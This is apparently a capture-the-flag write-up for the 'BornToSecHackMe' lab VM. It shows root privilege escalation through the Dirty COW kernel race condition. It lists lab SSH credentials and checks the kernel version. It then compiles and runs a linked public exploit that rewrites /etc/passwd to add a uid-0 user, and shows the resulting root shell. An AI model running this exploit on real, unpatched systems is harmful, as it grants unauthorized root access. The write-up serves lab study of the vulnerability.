# BONUS1 : DIRTY COW

When we search a way to get root on syslinux for writeup2, we found an other way called dirtycow, who exploit a `race-condition vulnerability`. (
[dirty cow](https://en.wikipedia.org/wiki/Dirty_COW#:~:text=The%20vulnerability%20has%20been%20patched,26%20and%20newer.))

This vulnerability is fixed on kernel version 4.8 and superior, so we need to know our version of kernel, and be connected:

ssh user: `laurie`  
ssh password: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

```bash
ssh laurie@{IP}

laurie@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

We are now sure that dirtycow is possible, the version is bellow 4.8.

After some tests, we found this script of dirty cow who works on our vm : [dirtycow link](https://github.com/FireFart/dirtycow)

This exploit uses the pokemon exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line in /etc/passwd.

We create a file `dirty.c` with this script, then run with the command given by the creator of the script:

```bash
laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
laurie@BornToSecHackMe:~$ su firefart
Password:
firefart@BornToSecHackMe:/home/laurie# id
uid=0(firefart) gid=0(root) groups=0(root)
```